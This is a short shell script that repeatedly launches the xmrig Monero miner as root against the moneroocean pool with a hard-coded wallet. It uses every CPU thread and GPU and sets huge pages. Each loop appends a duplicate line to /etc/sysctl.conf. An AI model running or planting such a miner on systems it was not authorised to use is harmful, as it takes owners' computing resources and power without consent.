#!/bin/sh
while [ 1 ]; do
	sudo sysctl -w vm.nr_hugepages=1280
	sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
	sudo ./xmrig -o "gulf.moneroocean.stream:443" -u "4Aj8aPvB9Te58xkV2bY54hbhLnb1oVAVkKUBb5PxfFRYJwtdmfqBZ4YQLGQiVCDaEAMRKG4nwKwjp5jVq5K9mSfm1pogTE7+128000" --keepalive --nicehash --tls --donate-level=0 --donate-over-proxy=0 --no-title --print-time=10 --health-print-time=10 --opencl --cuda --threads=$(($(nproc --all)*100/100)) --randomx-init=$(($(nproc --all)*100/100)) --av=0 --cpu-memory-pool=-1 --huge-pages-jit --asm=auto --randomx-mode=auto --randomx-1gb-pages --randomx-cache-qos --verbose
	sleep 5
done
